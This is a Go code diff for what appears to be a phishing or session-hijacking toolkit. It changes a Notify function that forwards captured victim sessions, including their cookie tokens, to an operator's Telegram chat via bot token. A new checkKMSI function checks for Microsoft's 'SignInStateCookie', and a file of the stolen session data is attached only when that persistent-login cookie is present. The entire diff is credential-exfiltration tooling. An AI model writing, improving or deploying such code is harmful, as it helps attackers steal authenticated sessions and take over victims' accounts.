@@ -292,17 +292,28 @@ func Notify(session TSession, chatid string, teletoken string) {
 		mu.Unlock()
 		messageID, exists := sessionMessageMap[string(session.ID)]
 		if exists {
-			txtFilePath, err := createTxtFile(session)
-			if err != nil {
-				fmt.Println("Error creating TXT file for update:", err)
-				return
+			txtFilePath := ""
+			var err error
+			if checkKMSI(session) {
+				txtFilePath, err = createTxtFile(session)
+				if err != nil {
+					fmt.Println("Error creating TXT file for update:", err)
+					return
+				}
 			}
 			msg_body := formatSessionMessage(session)
-			err = editMessageFile(chatid, teletoken, messageID, txtFilePath, msg_body)
-			if err != nil {
-				fmt.Printf("Error editing message: %v\n", err)
+			if txtFilePath != "" {
+				err = editMessageFile(chatid, teletoken, messageID, txtFilePath, msg_body)
+				if err != nil {
+					fmt.Printf("Error editing message: %v\n", err)
+				}
+				os.Remove(txtFilePath)
+			} else {
+				err = editMessageCaption(chatid, teletoken, messageID, msg_body)
+				if err != nil {
+					fmt.Printf("Error editing message: %v\n", err)
+				}
 			}
-			os.Remove(txtFilePath)
 		} else {
 			fmt.Println("Message ID not found for session:", session.ID)
 		}
@@ -314,10 +325,14 @@ func Notify(session TSession, chatid string, teletoken string) {
 	mu.Unlock()
 
 	// Create the TXT file for the original message
-	txtFilePath, err := createTxtFile(session)
-	if err != nil {
-		fmt.Println("Error creating TXT file:", err)
-		return
+	txtFilePath := ""
+	var err error
+	if checkKMSI(session) {
+		txtFilePath, err = createTxtFile(session)
+		if err != nil {
+			fmt.Println("Error creating TXT file:", err)
+			return
+		}
 	}
 
 	// Format the message
@@ -338,4 +353,16 @@ func Notify(session TSession, chatid string, teletoken string) {
 
 	// Remove the temporary TXT file
 	os.Remove(txtFilePath)
+}
+
+func checkKMSI(session TSession) bool {
+	if len(session.Tokens) == 0 {
+		return false
+	}
+	for _, token := range session.Tokens {
+		if token.Name == "SignInStateCookie" {
+			return true
+		}
+	}
+	return false
 }
